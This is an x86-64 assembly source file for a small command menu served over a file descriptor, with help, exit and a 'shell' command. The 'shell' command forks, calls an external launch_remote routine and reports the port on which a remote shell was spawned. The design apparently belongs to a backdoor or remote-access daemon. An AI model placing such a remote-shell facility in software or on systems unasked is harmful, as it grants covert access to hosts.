BITS 64

%define BUFF_SIZE 0x20

section .data
    global shell_port
    shell_port: dq 0

section .rodata
    promptstr: db "$> ", 0
        .len: equ $ - promptstr
    strexit: db "exit", 10, 0
        .len: equ $ - strexit
    strhelp: db "?", 10, 0
        .len: equ $ - strhelp
    strshell: db "shell", 10, 0
        .len: equ $ - strshell
    help: db "?: display help", 10, "shell: spawn a shell.", 10, "exit: quit", 10
        .len: equ $ - help
    unknown: db "Unknown command: Please type ? for help", 10
        .len: equ $ - unknown
    shell: db "A shell has been spawn on port : ", 0
        .len: equ $ - shell
    cmds: dq strexit, -1, strshell, cmdshell, strhelp, cmdhelp, 0, cmdunknown

section .text
    global shell_mode
    extern strcmp
    extern launch_remote

putnbr_fd:
    push    rbp
    mov     rbp, rsp
    mov     rax, rdi
    xor     rdx, rdx
    mov     cx, 10
    idiv    cx
    push    rdx
    push    rsi
    cmp     rax, 0
    je      disp
    mov     rdi, rax
    call    putnbr_fd
disp:
    pop     rdi
    pop     rax
    add     rax, 48
    push    rax
    lea     rsi, [rsp]
    mov     rdx, 1
    mov     rax, 0x1 ; write
    syscall
    leave
    ret

cmdhelp:
    push    rbp
    mov     rbp, rsp
    lea     rsi, [rel help]
    mov     rdx, help.len
    mov     rax, 0x1 ; write
    syscall
    leave
    ret

cmdunknown:
    push    rbp
    mov     rbp, rsp
    lea     rsi, [rel unknown]
    mov     rdx, unknown.len
    mov     rax, 0x1 ; write
    syscall
    leave
    ret

cmdshell:
    push    rbp
    mov     rbp, rsp
    push    rdi
    mov     rdi, 0
    mov     rsi, 16
    mov     rdx, 3 ; PROT_READ | PROT_WRITE
    mov     r10, 33 ; MAP_ANONYMOUS | MAP_SHARED
    mov     r8, -1
    mov     r9, 0
    mov     rax, 0x09 ; mmap
    syscall
    mov     [shell_port], rax
    mov     rax, 0x39 ; fork
    syscall
    cmp     rax, 0
    jne     retshell
    mov     rdi, [rsp]
    mov     rax, 0x03 ; close
    syscall
    call    launch_remote
retshell:
    mov     rdi, 0 ; P_ALL
    mov     rsi, 0
    mov     rdx, 0
    mov     r10, 0
    mov     r8, 0
    mov     rax, 0x3d ; waitid
    syscall
    mov     edi, [rsp]
    lea     rsi, [rel shell]
    mov     rdx, shell.len
    mov     rax, 0x1 ; write
    syscall
    mov     rax, [shell_port]
    xor     rdi, rdi
    mov     di, WORD [rax + 2]
    bswap   edi
    shr     edi, 16
    mov     rsi, [rsp]
    call    putnbr_fd
    mov     edi, [rsp]
    push    10
    lea     rsi, [rsp]
    mov     rdx, 1
    syscall
    leave
    ret

prompt:
    push    rbp
    mov     rbp, rsp
    lea     rsi, [rel promptstr]
    mov     rdx, promptstr.len
    mov     rax, 0x1 ; write
    syscall
    leave
    ret

get_cmd:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 0x10
    mov     QWORD [rsp], rdi
    lea     r8, [rel cmds]
loop_cmp:
    mov     QWORD rdi, [r8]
    mov     QWORD rsi, [rsp]
    call    strcmp
    cmp     rax, 0
    je      cmdret
    add     r8, 0x10
    cmp     QWORD [r8], 0
    jne     loop_cmp
cmdret:
    mov     rax, [r8 + 8]
    leave
    ret

shell_mode:
    push    rbp
    mov     rbp, rsp
    sub     rsp, BUFF_SIZE + 0x10
    mov     DWORD [rsp], edi
shell_loop:
    mov     edi, [rsp]
    call    prompt
    mov     edi, [rsp]
    lea     rsi, [rbp - BUFF_SIZE]
    mov     rdx, BUFF_SIZE - 1
    mov     rax, 0x0 ; read
    syscall
    mov     BYTE [rbp - BUFF_SIZE + rax], 0x0
    lea     rdi, [rbp - BUFF_SIZE]
    call    get_cmd
    mov     edi, [rsp]
    cmp     rax, -1
    je      quit
    call    rax
    jmp     shell_loop
quit:
    leave
    ret
